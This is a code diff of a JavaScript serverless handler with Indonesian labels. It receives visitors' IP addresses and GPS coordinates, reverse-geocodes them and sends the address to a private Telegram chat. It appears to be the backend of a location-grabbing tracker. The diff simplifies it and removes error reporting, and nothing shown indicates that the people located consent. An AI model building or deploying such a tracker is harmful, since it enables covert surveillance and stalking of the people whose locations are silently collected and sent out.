@@ -1,9 +1,13 @@
-export default async function handler(req, res) {
+module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     
-    if (req.method === 'OPTIONS') return res.status(200).end();
-    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+    
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
+    }
     
     const { ip, lat, lon, accuracy } = req.body;
     
@@ -17,9 +21,7 @@ export default async function handler(req, res) {
         try {
             const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
             msg += `🏠 Alamat: ${geo.display_name || '-'}\n`;
-        } catch(e) {
-            msg += `🏠 Alamat: gagal reverse\n`;
-        }
+        } catch(e) {}
     } else if (ip) {
         try {
             const geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
@@ -31,27 +33,11 @@ export default async function handler(req, res) {
     
     msg += `\n🕐 Waktu: ${new Date().toISOString()}`;
     
-    // Kirim ke Telegram
-    let tgResult = null;
-    let tgError = null;
-    
-    try {
-        const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: msg })
-        });
-        tgResult = await tgResponse.json();
-        console.log('Telegram OK:', tgResult);
-    } catch (err) {
-        tgError = err.message;
-        console.error('Telegram error:', err);
-    }
-    
-    // Return response
-    res.json({ 
-        status: 'ok',
-        telegram: tgResult || { error: tgError },
-        data: { ip, lat, lon, accuracy }
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
     });
-}
+    
+    res.json({ status: 'ok' });
+};
